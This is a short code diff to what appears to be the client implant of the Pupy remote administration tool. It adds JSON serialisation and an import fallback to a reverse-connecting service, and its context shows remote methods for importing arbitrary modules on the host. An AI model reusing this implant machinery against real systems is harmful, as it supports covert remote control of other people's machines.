@@ -37,6 +37,7 @@ import re
 import ssl
 import random
 import imp
+import json
 import argparse
 from network import conf
 from network.lib.base_launcher import LauncherError
@@ -64,9 +65,11 @@ def add_pseudo_pupy_module():
         mod.__package__="pupy"
         sys.modules["pupy"]=mod
         mod.pseudo=True
-
-if "pupy" not in sys.modules:
-    add_pseudo_pupy_module()
+try:
+    import pupy
+except ImportError:
+    if "pupy" not in sys.modules:
+        add_pseudo_pupy_module()
 import pupy
 pupy.infos={} #global dictionary to store informations persistent through a deconnection
 
@@ -118,6 +121,8 @@ class ReverseSlaveService(Service):
     def exposed_getmodule(self, name):
         """imports an arbitrary module"""
         return __import__(name, None, None, "*")
+    def exposed_json_dumps(self, obj):
+        return json.dumps(obj)
     def exposed_getconn(self):
         """returns the local connection instance to the other side"""
         return self._conn
